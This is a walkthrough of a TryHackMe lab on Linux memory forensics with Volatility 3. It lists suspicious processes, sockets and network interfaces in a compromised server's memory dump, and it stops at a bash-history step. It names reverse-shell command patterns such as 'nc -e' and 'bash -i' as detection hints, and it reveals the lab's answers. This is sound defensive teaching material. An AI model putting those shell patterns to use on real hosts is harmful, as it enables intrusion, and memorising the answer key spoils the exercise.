---
layout: post
title: "TryHackMe | Linux Memory Analysis"
date: 2025-09-15
tags: ["tryhackme"]
categories: [tryhackme]
hubs: "TryHackMe/Advanced Endpoint Investigations/Memory Analysis"
identifier: "20250915T000000"
source_urls: "https://tryhackme.com/room/linuxmemoryanalysis"
source_path: "Advanced Endpoint Investigations/Memory Analysis/20250920T215433--tryhackme-linux-memory-analysis.md"
---

{% raw %}



# TryHackMe | Linux Memory Analysis

## Task 1 | Introduction

When investigating a cyber incident, a system's memory is one of the most volatile and revealing sources of evidence. Memory forensics helps uncover valuable information about what was happening on a machine at a specific time, such as running processes, open files, network connections, credentials, and more.

 In this room, we will continue our investigation of the APT attack on the TryHatMe company and look at the footprints that the adversary left behind in the memory of the Linux machine. It is suspected that the adversary got access to the Linux server via lateral movement.

 Prerequisites To understand the concepts and technicalities covered in this room, it is expected that the user is well-versed with Volatility and has covered the following rooms:

 
- [Volatility](https://tryhackme.com/room/volatility)
- [Linux Live Analysis](https://tryhackme.com/room/linuxliveanalysis)
- [Windows Memory & User Activity](https://tryhackme.com/room/windowsmemoryanduseractivity)
- [Windows Memory & Processes](https://tryhackme.com/room/windowsmemoryandprocs)

 Learning Objectives In this room, we will examine the footprints of the adversary's actions in the compromised Linux server. Some of the key topics that we will cover are:

 
- Overview of the Linux and Windows memory layout.
- Learn how to utilize Volatility to investigate Linux memory.
- Learn how to investigate the running processes and network connections and identify the odd ones.

 Let's dive in.

### **Answer the questions below**

**Question:** Continue to the next task.

*Answer:* 

     No answer needed

---

## Task 2 | Scenario Information

This is the continuation of the scenario covered in the previous rooms. We will focus on the Linux Server compromised via lateral movement in this room.

 Recapping the Scenario You are part of the incident response team handling an incident at TryHatMe - a company that exclusively sells hats online. You are tasked with analyzing a full memory dump of a potentially compromised Linux host. Before you, another analyst had already taken a full memory dump and gathered all the necessary information from the TryHatMe IT support team. Since this is your first case, you are a bit nervous, but don't worry; a senior analyst will guide you.

 Information Incident THM-0001 
- On May 5th, 2025, at 07:30 CET, TryHatMe initiated its incident response plan and escalated the incident to us. After an initial triage, our team found a Windows host that was potentially compromised. This led to a full-scale investigation and discovered that the Linux server FS-01 was also compromised along with the Windows machines.
- The details of the host are as follows: 
- Hostname: FS-01
- OS: Linux 5.15.0-1066
- At 07:45 CET, our analyst Steve Stevenson took a full memory dump of the Windows host and made a hash to ensure its integrity. The memory dump details are: 
- Name: `FS-01.mem`
- MD5-hash: `c0fbf40989bda765b8edaa41f72d3ee9`

 Company Information TryHatMe **Network Map**

 ![Image 1](https://tryhackme-images.s3.amazonaws.com/user-uploads/66c44fd9733427ea1181ad58/room-content/66c44fd9733427ea1181ad58-1747929180104.png)

 Let's move on to the next task: Connect to our analysis lab and start to investigate the adversary's footprints in the Linux server's memory.

### **Answer the questions below**

**Question:** Continue to the next task.

*Answer:* 

     No answer needed

---

## Task 3 | Lab Connection

Start Machine Start Machine Before moving forward, start the lab by clicking the `Start Machine` button. It will take 3 minutes to load properly. The VM will be accessible on the right side of the split screen. If the VM is not visible, use the blue Show Split View button at the top of the page.

 **Note:**  The memory image `FS-01.mem` used in this room is in the `/home/ubuntu/Desktop/artifacts/` directory.

### **Answer the questions below**

**Question:** Connect with the lab.

*Answer:* 

     No answer needed

---

## Task 4 | Memory Overview: Linux vs Windows

It is important to understand how memory works in Linux before starting to analyze the memory dump. While Linux and Windows utilize RAM for process execution, system caching, and runtime operations, their memory architectures, management, and artifacts differ substantially.

 This task provides an overview of Linux memory and how it contrasts with Windows memory systems. You’ll learn key concepts such as virtual memory, page tables, memory regions, and how memory appears in forensic dumps.

 Memory Memory (RAM) is where active processes and kernel operations are stored during system operation. Both operating systems use **virtual memory**  to give each process the illusion of having its own isolated memory space.

 However, their memory management models diverge in key areas:

      Feature Linux Windows     **Swap Management**  Configurable `swap` partitions or files Pagefile (`pagefile.sys`)   **Process Memory Structure**  `/proc/<pid>/maps` shows regions; split into stack, heap, mmap, etc. Uses VADs (Virtual Address Descriptors) for each process   **Kernel/User Split**  3GB/1GB or 2GB/2GB (on 32-bit); user and kernel memory strictly separated Similar split, but uses different paging structures   **Tools**  `top`, `free`, `vmstat`, `/proc` Task Manager, RAMMap, WinDbg      How Linux Manages Memory 
- **Physical vs Virtual Memory** : Every process is given a virtual address space. Using page tables, the MMU (Memory Management Unit) translates these to physical addresses.
- **Memory-mapped Files** : Shared libraries and files are loaded into memory using `mmap()`. This helps in efficient sharing across processes.
- **Kernel Memory:**  Managed separately from normal programs.
- **Swap** : When RAM is exhausted, less-used memory pages are moved to swap, freeing space.

 Linux and Windows both use virtual memory, but their internal structures and exposure to forensics tools differ. Linux provides more direct access to live memory views through the `/proc` filesystem, while Windows relies on kernel-level structures like Virtual Address Descriptors (VADs) to manage memory.

 Recapping the Process A process is a fundamental unit of execution in an operating system. It represents a running instance of a program, including its memory, CPU context, and system resources. While both Linux and Windows support multitasking through processes, they differ significantly in how they structure, manage, and expose process data. Understanding these differences is vital in memory forensics and threat detection. At its core, a process includes a unique process ID (PID), a dedicated memory space, an execution context (like CPU registers and scheduling data), and a set of resources such as open files and network connections. A process consists of:

 
- **A PID (Process ID):**  A process ID (PID) is a unique identifier the operating system assigns to every active process. It enables tracking, managing, and referencing a process during its lifecycle.
- **Memory space** : Each process gets its own **virtual address space** , broken into key regions: 
- **Code segment** : Contains executable instructions.
- **Heap** : Dynamically allocated memory (e.g., via `malloc()`).
- **Stack** : Manages function calls and local variables.
- **Memory-mapped files** : Files mapped into memory (e.g., shared libraries, config files).
- **Execution context**  (registers, scheduling info): The **execution context**  of a process or thread includes: 
- **Register values:**  EIP/RIP for instruction pointer and ESP/RSP for stack pointer.
- **Program counter:**  Tracks instruction execution.
- **Scheduler metadata** : Priority, CPU time, and state (running, sleeping, etc.).
- **Open File Descriptors:**  **File descriptors**  (FDs) are integer handles pointing to open files, sockets, or pipes used by a process. On UNIX-like systems, this includes everything from log files to `/dev/null` to TCP ports.
- **Parent/Child Relationships (Process Tree):** Processes are organized hierarchically. A **parent**  spawns a **child**  using system calls like `fork()` (Unix) or `CreateProcess()` (Windows). This forms a **process tree** , which is useful for tracing activity lineage.

 Processes may spawn other processes, forming parent-child relationships that define process trees. In forensic terms, a process also leaves behind runtime artifacts that help analysts determine what was executed, how it behaved, and what resources it accessed.

 Linux vs Windows: Process Models In Linux, each process is internally represented by a structure called task_struct. This kernel-level data structure holds PID, state, memory pointers, CPU usage, and more information. Linux also treats threads as lightweight processes, meaning every thread has its own PID. It is managed similarly to full processes, with specific flags (via the clone() system call) differentiating thread behavior.

 On Windows, the equivalent structure is EPROCESS, which resides in kernel memory. Unlike Linux, threads in Windows exist as entities within a process; they do not have standalone identifiers visible like Linux threads do.

      Feature Linux Windows     **Process Structure**  `task_struct` in the kernel `EPROCESS` kernel object   **Threads**  Implemented as lightweight processes (CLONE flags) Threads reside inside processes   **Hierarchy**  True parent-child relationships (`pstree`) Parent-child relationships exists but is often obscured   **Process Listing**  `/proc`, `ps`, `top` Task Manager, `tasklist`, `Get-Process`   **PID Reuse**  PIDs are reused; tracked via `/proc/<pid>` Similar PID reuse model   **Artifacts**  `/proc/<pid>/`, `cmdline`, `status`, `maps`, `exe`, `cwd` Memory image must be parsed to extract process metadata      Anatomy of a Linux Process Linux offers transparent access to live process information through the /proc pseudo-filesystem. For example:

 
- `/proc/<pid>/cmdline` provides command-line arguments.
- `/proc/<pid>/status` shows metadata like UID, memory usage, and thread count.
- `/proc/<pid>/exe` is a symlink to the binary executed.
- `/proc/<pid>/maps` reveals memory layout.
- `/proc/<pid>/fd/` lists open file descriptors.

 From a forensic perspective, Linux gives direct access to live process artifacts through the /proc filesystem. Analysts can check memory maps, open files, load libraries, and even inspect a running binary via symbolic links. This transparency is a powerful feature in Linux for live system analysis.

### **Answer the questions below**

**Question:** Continue to the next task.

*Answer:* 

     No answer needed

---

## Task 5 | Hunting for Suspicious Process

Now that our lab machine is loaded, let's start examining the Linux memory image to find the footprints of the attack patterns. We may wonder where to begin our analysis. Let's start by reviewing the running processes on the machine at the time of the capture. We'll use **Volatility** to examine a Linux memory image placed in the folder on the Desktop. Our goal is to **hunt for suspicious processes** that may indicate compromise. This includes checking unusual process names, parent-child relationships, anomalous users, hidden processes, and privilege escalation attempts.

 Verifying the Hash Let's run the following command to verify the integrity of the Linux memory dump, as shown below:

   Integrity Check 
```Integrity Check 
ubuntu@tryhackme:~/Desktop/artifacts$ md5sum FS-01.mem      c0fbf40989bda765b8edaa------  FS-01.mem
```

   As it will take time to process, the command output is already stored in the `md5_hash` file.

 Volatility Usage In this room, we will rely on Volatility 3 to extract the volatile footprints of the attack on the Linux machine at the time of the memory capture. Let's run the following command to get the Volatility help:

 **Command:** `vol3 --help`

   Volatility Help 
```Volatility Help 
ubuntu@tryhackme:~/Desktop/artifacts$ vol3 --helpVolatility 3 Framework 2.26.2usage: vol.py [-h] [-c CONFIG] [--parallelism [{processes,threads,off}]]              [-e EXTEND] [-p PLUGIN_DIRS] [-s SYMBOL_DIRS] [-v] [-l LOG]              [-o OUTPUT_DIR] [-q] [-r RENDERER] [-f FILE] [--write-config]              [--save-config SAVE_CONFIG] [--clear-cache]              [--cache-path CACHE_PATH] [--offline | -u URL]              [--filters FILTERS] [--hide-columns [HIDE_COLUMNS ...]]              [--single-location SINGLE_LOCATION] [--stackers [STACKERS ...]]              [--single-swap-locations [SINGLE_SWAP_LOCATIONS ...]]              PLUGIN ...---- REDACTED-----
```

   Linux Plugins We can use the grep to list down the available plugins for the Linux image, using the command `vol3 --help | grep linux` as shown below:

   Available Linux Plugins 
```Available Linux Plugins 
ubuntu@tryhackme:~/Desktop/artifacts$ vol3 --help | grep linux
banners.Banners : Attempts to identify potential Linux banners
linux.bash.Bash Recovers bash command history from memory.
linux.boottime.Boottime
linux.capabilities.Capabilities
linux.check_afinfo.Check_afinfo
linux.check_creds.Check_creds
linux.check_idt.Check_idt
linux.check_modules.Check_modules
linux.check_syscall.Check_syscall
linux.ebpf.EBPF Enumerate eBPF programs
linux.elfs.Elfs Lists all memory-mapped ELF files for all processes.
linux.envars.Envars
linux.graphics.fbdev.Fbdev
linux.hidden_modules.Hidden_modules
linux.iomem.IOMem  generates an output similar to /proc/iomem on a
linux.ip.Addr  Lists network interface information for all devices
linux.ip.Link  Lists information about network interfaces similar to
----REDACTED----
```

   Identify the Correct Linux Banner Before starting to work with Volatility, it is important to note that Volatility version 2 is needed to identify the correct profile. Volatility 3, which we are using in this room, needs to have the symbols table of the Operating System version you are analyzing to understand the structure of the memory dump.

 **Command:**  `vol3 -f FS-01.mem banners.Banners`

   Terminal 
```Terminal 
ubuntu@tryhackme:~/Desktop/artifacts$ vol3 -f FS-01.mem banners.BannersVolatility 3 Framework 2.26.2
Progress:  100.00		PDB scanning finished                
Offset	Banner
0x18600200  Linux version 5.15.0-1066-aws (buildd@lcy02-amd64-037) (gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, GNU ld (GNU Binutils for Ubuntu) 2.34) #72~20.04.1-Ubuntu SMP Thu Jul 18 10:41:27 UTC 2024 (Ubuntu 5.15.0-1066.72~20.04.1-aws 5.15.158)
0x1a6396f8	Linux version 5.15.0-1066-aws (buildd@lcy02-amd64-037) (gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, GNU ld (GNU Binutils for Ubuntu) 2.34) #72~20.04.1-Ubuntu SMP Thu Jul 18 10:41:27 UTC 2024 (Ubuntu 5.15.0-1066.72~20.04.1-aws 5.15.158)8)
0x65db6e40	Linux version 5.15.0-1066-aws (buildd@lcy02-amd64-037) (gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, GNU ld (GNU Binutils for Ubuntu) 2.34) #72~20.04.1-Ubuntu SMP Thu Jul 18 10:41:27 UTC 2024 (Ubuntu 5.15.0-1066.72~20.04.1-aws 5.15.158)
```

   As it will take time to process, the command output is stored in the `linux_banner` file.

 List All Running Processes Lists the active processes as stored in the OS kernel's task list. This provides a snapshot of what was running at the time of capture.

 **Note:**  As it will take time to process, the command output is already stored in the `pslist_output` file.

 **Command:** `vol3 -f FS-01.mem linux.pslist.PsList`

   Terminal 
```Terminal 
ubuntu@tryhackme:~/Desktop/artifacts$ vol3 -f FS-01.mem linux.pslist.PsList
Volatility 3 Framework 2.26.2
Progress:  100.00		Stacking attempts finished           
OFFSET (V)	PID	TID	PPID	COMM	UID	GID	EUID	EGID	CREATION TIME	File output

0x8be20024cc80	1	1	0	systemd	0	0	0	0	2025-06-02 09:50:56.255885       UTC	Disabled
0x8be20024b300	2	2	0	kthreadd	0	0	0	0	2025-06-02 09:50:56.255885     UTC	Disabled
0x8be200248000	3	3	2	rcu_gp	0	0	0	0	2025-06-02 09:50:56.367885         UTC	Disabled
0x8be20024e600	4	4	2	rcu_par_gp	0	0	0	0	2025-06-02 09:50:56.367885     UTC	Disabled
0x8be200249980	5	5	2	slub_flushwq	0	0	0	0	2025-06-02 09:50:56.367885 UTC	Disabled
0x8be20025cc80	6	6	2	netns	0	0	0	0	2025-06-02 09:50:56.367885         UTC	        Disabled
0x8be200258000	8	8	2	kworker/0:0H	0	0	0	0	2025-06-02 09:50:56.367885 UTC	Disabled
0x8be200259980	10	10	2	mm_percpu_wq	0	0	0	0	2025-06-02 09:50:56.367885 UTC	Disabled
0x8be200263300	11	11	2	rcu_tasks_rude_	0	0	0	0	2025-06-02 09:50:56.367885 UTC	Disabled
0x8be200260000	12	12	2	rcu_tasks_trace	0	0	0	0	2025-06-02 09:50:56.367885 UTC	Disabled      ------------------------REDACTED-------------------------------------------------
```

   We can also save the output to a file and then read the output file for further analysis, as shown below:

 **Command** : `vol3 -f FS-01.mem linux.pslist.PsList > ps_output`

   Terminal 
```Terminal 
ubuntu@tryhackme:~/Desktop/artifacts$ vol3 -f FS-01.mem linux.pslist.PsList > ps_output      ubuntu@tryhackme:~$ cat ps_outputVolatility 3 Framework 2.26.2
Progress:  100.00		Stacking attempts finished           
OFFSET (V)	PID	TID	PPID	COMM	UID	GID	EUID	EGID	CREATION TIME	File output

0x8be20024cc80	1	1	0	systemd	0	0	0	0	2025-06-02 09:50:56.255885         UTC	Disabled
0x8be20024b300	2	2	0	kthreadd	0	0	0	0	2025-06-02 09:50:56.255885     UTC	Disabled
0x8be200248000	3	3	2	rcu_gp	0	0	0	0	2025-06-02 09:50:56.367885         UTC	Disabled
0x8be20024e600	4	4	2	rcu_par_gp	0	0	0	0	2025-06-02 09:50:56.367885     UTC	Disabled      -------------------------------REDACTED------------------------------------------------------------
```

   **Forensics Value**

 
- Displays all currently linked processes from the kernel task list.
- Reflects what the live system’s ps or top commands would show.
- Helps establish the baseline of visible processes at the time of capture.
- Validates running services, daemons, shells, and tools.
- Can help identify suspicious tools running (e.g., nc, python, wget).

 PsScan We can use the PsScan plugin to let Volatility scan the memory for the processes based on the signature and retrieve the hidden processes that the PsList plugin may have missed.

 **Note:**  The command will take about **2 minutes** to fully execute.

 **Command:** `vol3 -f FS-01.mem linux.psscan.PsScan`

   Terminal 
```Terminal 
ubuntu@tryhackme:~/Desktop/artifacts$ vol3 -f FS-01.mem linux.psscan.PsScanVolatility 3 Framework 2.26.2
Progress:  100.00		Stacking attempts finished           
OFFSET (P)	PID	TID	PPID	COMM	EXIT_STATE

0x12b8000	1287	1366	1020	gdbus	TASK_RUNNING
0x12b9980	1264	1268	1020	gmain	TASK_RUNNING
0x12bb300	1264	1271	1020	dconf worker	TASK_RUNNING
0x12be600	1299	1321	1020	dconf worker	TASK_RUNNING
0x12c0000	1275	1290	1020	gdbus	TASK_RUNNING
0x12c3300	1264	1276	1020	gdbus	TASK_RUNNING
0x12c4c80	1275	1275	1020	polkit-mate-aut	TASK_RUNNING
0x12c6600	17339	17339	1150	ssh-agent	TASK_RUNNING
0x12c8000	9367	9367	2	xfsalloc	TASK_RUNNING
0x12c9980	1390	1416	1	dconf worker	TASK_RUNNING
0x12cb300	1275	1289	1020	dconf worker	TASK_RUNNING
0x12ccc80	1390	1413	1	gmain	TASK_RUNNING
0x12ce600	1275	1288	1020	gmain	TASK_RUNNING
0x12d0000	1287	1287	1020	blueman-applet	TASK_RUNNING
0x12d1980	1388	1428	1020	gdbus	TASK_RUNNING
0x12d3300	1313	1322	1020	gmain	TASK_RUNNING     ------------------------------REDACTED-----------------------------------------------------
```

   The command output is already stored in the `psscan_output` file. Examine the output and see if you can find more suspicious processes. This scan is useful, especially in retrieving hidden or terminated processes with footprints still in memory.

 **Forensics Value**

 
- Detects hidden or unlinked processes, rootkits, etc.
- Reveals terminated or orphaned processes still in memory.
- Cross-referencing psscan with pslist helps find stealth malware.
- Critical for post-compromise investigations where attackers attempt to hide activity.

 Processes With Arguments Another interesting plugin is `psaux`, which helps us retrieve processes with arguments. This plugin can be used to identify suspicious processes with odd-looking arguments passed to them.

 **Command** : `vol3 -f FS-01.mem linux.psaux.PsAux`

   Terminal 
```Terminal 
ubuntu@tryhackme:~/Desktop/artifacts$ vol3 -f FS-01.mem linux.psaux.PsAux                     Volatility 3 Framework 2.26.2     Progress:  100.00        Stacking attempts finished                PID    PPID    COMM        ARGS
1      0    systemd    /sbin/init      707    1    cron        /usr/sbin/cron -f      715    1    whoopsie    /usr/bin/whoopsie -f      716    1    atd          /usr/sbin/atd -f      738    1    kerneloops    /usr/sbin/kerneloops --test     746    1    agetty       /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220      752    1    kerneloops    /usr/sbin/kerneloops     754    1    lightdm      /usr/sbin/lightdm    764    1    agetty      /sbin/agetty -o -p -- \u --noclear tty1 linux     821    1    REDACTED    /home/REDACTED     838    1    systemd      /lib/systemd/systemd --user     841    838    (sd-pam)    (sd-pam)     904    1    rtkit-daemon    /usr/libexec/rtkit-daemon17374    17344    python3    python3 -m http.server REDACTED---------------------REDACTED---------------------------------------------------
```

   The command output is already stored in the `psaux_output` file. Examine the output and see if you can find some processes with suspicious arguments.

 **Forensics Value**

 
- Provides the full command-line for each running process (like ps aux).
- Reveals use of suspicious commands or flags (e.g., nc -e, curl http, bash -i).
- Useful for reverse shell detection, malicious script execution, or credential theft.
- Allows correlation between PID and behavior observed in other plugins (e.g., netstat or maps).
- Helps differentiate legitimate vs. abused binaries.

 Process Mapping The plugin `proc.Maps` enumerates memory mappings for processes in a Linux memory dump. It mimics the contents of `/proc/<pid>/maps` on a live system, showing how each process maps executable files, shared libraries, heap/stack regions, and potentially malicious memory allocations into its address space.

 Command: `vol3 -f FS-01.mem linux.proc.Maps`

   Terminal 
```Terminal 
ubuntu@tryhackme:~$ vol3 -f FS-01.mem linux.proc.Maps      Volatility 3 Framework 2.26.2     Progress:  100.00        Stacking attempts finished
PID    Process    Start    End    Flags    PgOff    Major    Minor    Inode    File Path    File output      1    systemd    0x559fc4e4b000    0x559fc4e7d000    r--    0x0    259    1    17651    /usr/lib/systemd/systemd    Disabled      1    systemd    0x559fc4e7d000    0x559fc4f3c000    r-x    0x32000    259    1    17651    /usr/lib/systemd/systemd    Disabled      1    systemd    0x559fc4f3c000    0x559fc4f92000    r--    0xf1000    259    1    17651    /usr/lib/systemd/systemd    Disabled      1    systemd    0x559fc4f92000    0x559fc4fd8000    r--    0x146000    259    1    17651    /usr/lib/systemd/systemd    Disabled     1    systemd    0x559fc4fd8000    0x559fc4fd9000    rw-    0x18c000    259    1    17651    /usr/lib/systemd/systemd    Disabled     1    systemd    0x559fc50d1000    0x559fc53c0000    rw-    0x0    0    0    0    [heap]    Disabled      1    systemd    0x7fefc4000000    0x7fefc4021000    rw-    0x0    0    0    0    Anonymous Mapping    Disabled     1    systemd    0x7fefc4021000    0x7fefc8000000    ---    0x0    0    0    0    Anonymous Mapping    Disabled      1    systemd    0x7fefcc000000    0x7fefcc021000    rw-    0x0    0    0    0    Anonymous Mapping    Disabled      1    systemd    0x7fefcc021000    0x7fefd0000000    ---    0x0    0    0    0    Anonymous Mapping    Disabled     1    systemd    0x7fefd2d35000    0x7fefd2d36000    ---    0x0    0    0    0    Anonymous Mapping    Disabled     1    systemd    0x7fefd2d36000    0x7fefd3536000    rw-    0x0    0    0    0    Anonymous Mapping    Disabled     1    systemd    0x7fefd3536000    0x7fefd3537000    ---    0x0    0    0    0    Anonymous Mapping    Disabled      1    systemd    0x7fefd3537000    0x7fefd3d3e000    rw-    0x0    0    0    0    Anonymous Mapping    Disabled      1    systemd    0x7fefd3d3e000    0x7fefd3d4b000    r--    0x0    259    1    22584    /usr/lib/x86_64-linux-gnu/libm-2.31.so    Disabled      1    systemd    0x7fefd3d4b000    0x7fefd3df2000    r-x    0xd000    259    1    22584    /usr/lib/x86_64-linux-gnu/libm-2.31.so    Disabled     1    systemd    0x7fefd3df2000    0x7fefd3e8b000    r--    0xb4000    259    1    22584    /usr/lib/x86_64-linux-gnu/libm-2.31.so    Disabled      1    systemd    0x7fefd3e8b000    0x7fefd3e8c000    r--    0x14c000    259    1    22584    /usr/lib/x86_64-linux-gnu/libm-2.31.so    Disabled     1    systemd    0x7fefd3e8c000    0x7fefd3e8d000    rw-    0x14d000    259    1    22584    /usr/lib/x86_64-linux-gnu/libm-2.31.so    Disabled      -------------------------------[REDACTED]--------------------------------------------------------------------
```

   As it will take time to process, the command output is stored in the `procmap_output` file. Examine the output and see if you can find some processes with suspicious arguments.

 **Forensics Value**

 
- Reveals how each process maps memory regions (executables, libraries, heap, stack, anonymous regions).
- Detects in-memory malware(e.g., unpacked payloads, injected shellcode).
- Flags suspicious permissions**** like `rwxp` (read-write-execute-private) are often used for shellcode.
- Helps identify **fileless malware** , as memory segments may hold active code.
- Detects processes loading binaries from suspicious paths (e.g., `/tmp/`).
- Allows reconstruction of process layout to correlate with behavior or anomaly.
- Essential for confirming the process of hollowing or injection.

### **Answer the questions below**

**Question:** What is the MD5 hash of the image we are investigating?

*Answer:* 

     c0fbf40989bda765b8edaa41f72d3ee9

**Question:** What is the PID of the suspicious Netcat process?

*Answer:* 

     15011

**Question:** What is the name of the suspicious process running from the hidden tmp directory?

*Answer:* 

     .strokes

**Question:** What port number was used while setting up a Python server to transfer files?

*Answer:* 

     9090

**Question:** A suspicious process with PID 821 was found running on the system. What is the full path of the process?

*Answer:* 

     /home/mircoservice/printer_app

---

## Task 6 | Hunting for Suspicious Network Activities

Analyzing memory for suspicious network connections is crucial when investigating malware, persistence, or lateral movement. Attackers often use reverse shells, backdoors, or tunnels; memory may be the only place to detect them. In the memory, we can look for the footprints of the network connections and hunt for the suspicious ones.

 Some of the key information we can look for in terms of network connection in the Linux memory is:

 
- Open Network connections
- Reverse Shell
- Socket details
- Network Interfaces

 Identify IP Information Let's start our hunting for network connections by exploring the interfaces and the IP address associated with the infected Linux machine, using the following command:

 **Command:**  `vol3 -f FS-01.mem linux.ip.Addr`

   IP Address Inforamtion 
```IP Address Inforamtion 
ubuntu@tryhackme:~/Desktop/artifacts$ vol3 -f FS-01.mem linux.ip.Addr          
Volatility 3 Framework 2.26.2
Progress:  100.00		Stacking attempts finished           
NetNS	Index	Interface	MAC	Promiscuous	IP	Prefix	Scope Type	State
4026531840	1	lo	00:00:00:00:00:00	False	127.0.0.1	8	host	UNKNOWN
4026531840	1	lo	00:00:00:00:00:00	False	::1	128	host	UNKNOWN
4026531840	2	ens5	02:83:88:6b:5a:1f	False	[--REDACTED--]	16	global	UP
4026531840	2	ens5	02:83:88:6b:5a:1f	False	fe80::83:88ff:fe6b:5a1f	64	link	UP
4026532265	1	lo	00:00:00:00:00:00	False	127.0.0.1	8	host	UNKNOWN
4026532265	1	lo	00:00:00:00:00:00	False	::1	128	host	UNKNOWN
```

   The command's output is already placed in the `ip.addr_output` file. This command provides information about the network interfaces, corresponding MAC addresses, and associated IP addresses.

 Identify Network Interface Information The following command will show the layer two interface information from the memory image. It shows the network devices/interfaces recognized by the kernel.

 **Command:**  `vol3 -f FS-01.mem linux.ip.Link`

   Network Interface Information 
```Network Interface Information 
ubuntu@tryhackme:~/Desktop/artifacts$ vol3 -f FS-01.mem linux.ip.Link         
Volatility 3 Framework 2.26.2
Volatility 3 Framework 2.26.2Progress:  100.00        Stacking attempts finished           NS           Interface    MAC               State    MTU      Qdisc                Qlen        Flags026531840      lo    00:00:00:00:00:00    UNKNOWN    65536    noqueue    1000    LOOPBACK,LOWER_UP,UP4026531840    ens5    [REDACTED]    UP     9001       mq    1000    BROADCAST,LOWER_UP,MULTICAST,UP4026532265     lo    00:00:00:00:00:00    UNKNOWN    65536    noqueue    1000    LOOPBACK,LOWER_UP,UP
```

   The command's output is already placed in the `ip.link_output` file. From a forensics point of view, we can examine the network interface information to identify some suspicious VPN tunneling or interfaces.

 Explore Socket Details We can extract the socket usage statistics from the kernel's perspective using the following command:

 Commandline: `vol3 -f FS-01.mem linux.sockstat.Sockstat`

   Checking Socket Details 
```Checking Socket Details 
ubuntu@tryhackme:~/Desktop/artifacts$ vol3 -f FS-01.mem linux.sockstat.Sockstat
Volatility 3 Framework 2.26.2
NetNS    Process Name    PID    TID    FD    Sock Offset    Family    Type    Proto    Source Addr    Source Port    Destination Addr    Destination Port    State    Filter026531840    systemd    1    1    126    0x8be20fd74440    AF_UNIX    STREAM    -    /run/systemd/journal/stdout      4738760    -    4738759    ESTABLISHED    -4026531840    systemd    1    1    127    0x8be207236a80    AF_UNIX    STREAM    -    /run/systemd/journal/stdout    4738761    -    4739223    ESTABLISHED    -4026531840    systemd    1    1    135    0x8be2038bfb80    AF_UNIX    STREAM    -    /run/avahi-daemon/socket       19420    -    -    LISTEN    -4026531840    systemd    1    1    137    0x8be204ed2200    AF_UNIX    STREAM    -    /run/lvm/lvmpolld.socket    1746    -    -    LISTEN    -4026531840    systemd    1    1    138    0x8be204edc880    AF_UNIX    STREAM    -    /run/snapd.socket    19429    -    -    LISTEN    -4026531840    systemd    1    1    139    0x8be204edd980    AF_UNIX    STREAM    -    /run/snapd-snap.socket    19431    -    -    LISTEN    -4026531840    systemd    1    1    140    0x8be2038b1540    AF_UNIX    STREAM    -    /run/acpid.socket    19807    -    -    LISTEN    -4026531840    systemd    1    1    141    0x8be2038bea80    AF_UNIX    STREAM    -    /run/dbus/system_bus_socket    19424    -    -    LISTEN    -4026531840    systemd    1    1    142    0x8be204ed2a80    AF_UNIX    STREAM    -    /run/systemd/journal/stdout    1759    -    -    LISTEN    -4026531840    systemd    1    1    144    0x8be204ed0440    AF_UNIX    DGRAM    -    /run/systemd/journal/socket    1761    -    -    UNCONNECTED    -4026531840    systemd    1    1    145    0x8be2038beec0    AF_UNIX    STREAM    -        19426    -    -    LISTEN    -4026531840    systemd    1    1    146    0x8be204ed0880    AF_UNIX    DGRAM    -    /run/systemd/journal/dev-log    1757    -    -    UNCONNECTED    -4026531840    systemd    1    1    147    0x8be203cb7000    AF_NETLINK    RAW    NETLINK_ROUTE    groups:0x800405d5    1    group:0x000000000    UNCONNECTED    -4026531840    systemd    1    1    148    0x8be203cb2800    AF_NETLINK    RAW    NETLINK_AUDIT    groups:0x00000001    1    group:0x000000000    UNCONNECTED    -4026531840    systemd    1    1    194    0x8be204ed1dc0    AF_UNIX    SEQPACKET    -    /run/udev/control    1764    -    -    UNCONNEC
```

   Note: The command takes about **2 minutes**  to fully execute. You can also find the information stored in the `socket_output` file.

 Let's break down some key information we get from this command:

 
- Process Name: Name of the process using the socket (from `/proc/<pid>/comm`).
- PID: Process ID that owns the socket.
- Source Address: the file path bound to the socket.
- STATE: Socket state: LISTEN, ESTABLISHED, UNCONNECTED, etc.
- Source Port / Destination Port: Source Port / Destination Port associated with the socket.

 **Forensics Value**

 
- Detects overall network activity from the kernel’s view, helping confirm if the system was engaged in active connections during the memory capture.
- Identifies potential backdoors or reverse shells by revealing unexpected socket usage.
- Helps examine and hunt for abnormal socket counts or excessive memory usage allocated to network connections.

 Investigating the footprints of network-based activity in memory is an important part of forensics. It provides visibility into all networking layers: interfaces, IP configurations, and socket-level behavior.

 Examine the network connections and see if you can find any suspicious connections and associated processes.

### **Answer the questions below**

**Question:** What is the IP address of the remote server, to which a TCP connection was established using python?

*Answer:* 

     10.100.1.125

**Question:** What was the IP address of the infected host found in the record?

*Answer:* 

     10.10.163.215

**Question:** What is the MAC address of the network interface associated with the infected device?

*Answer:* 

     02:83:88:6b:5a:1f

**Question:** What is the port number opened for the reverse shell by the adversary on the infected host?

*Answer:* 

     9898

---

## Task 7 | Hunting for User Activities

When a system is compromised, attackers typically interact with it through command-line tools like bash, sh, or python. Their footprints are often left behind in memory long after processes have terminated. By analyzing shell history, terminal usage, and related metadata, we can reconstruct what commands were run, by whom, and in what context.

 Bash History We can use the following command to locate the footprints of the command history from users’ Bash sessions (.bash_history or in-memory structures), offering direct insight into what actions a user performed.

 **Command:**  `vol3 -f FS-01.mem linux.bash.Bash`

   Bash History 
```Bash History 
